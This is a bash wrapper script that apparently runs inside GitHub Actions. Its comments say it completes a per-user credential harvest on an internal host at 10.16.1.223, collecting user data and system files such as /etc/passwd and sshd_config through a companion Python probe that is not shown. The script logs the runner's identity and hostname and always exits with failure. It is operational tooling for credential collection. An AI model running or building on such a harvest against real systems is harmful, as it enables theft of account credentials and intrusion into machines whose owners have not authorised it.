#!/usr/bin/env bash
# i10830 - finish the store03 (10.16.1.223) per-user credential harvest.
# Captures only the 26 users whose capture blocks the i9803 probe's 1.4 MB
# output cap dropped, plus the 10 AUTHONLY (nologin) users, plus the SYSTEM
# block (/etc/exports, /etc/fstab, /etc/passwd, sshd_config).  Read-only.
set -uo pipefail
echo "===I10830-WRAPPER-BEGIN $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown) job=${GITHUB_JOB:-?} run=${GITHUB_RUN_ID:-?}==="
export PYTHONUNBUFFERED=1
export I10830_PODID="$(id 2>/dev/null)"
export I10830_ID="$(id 2>/dev/null)"
export I10830_HOST="$(hostname 2>/dev/null)"
TMO="timeout 1500"
command -v timeout >/dev/null 2>&1 || TMO=""
$TMO python3 "$(dirname "${BASH_SOURCE[0]}")/i10830_probe.py"
rc=$?
echo "===I10830-WRAPPER-END rc=${rc} $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)==="
exit 1
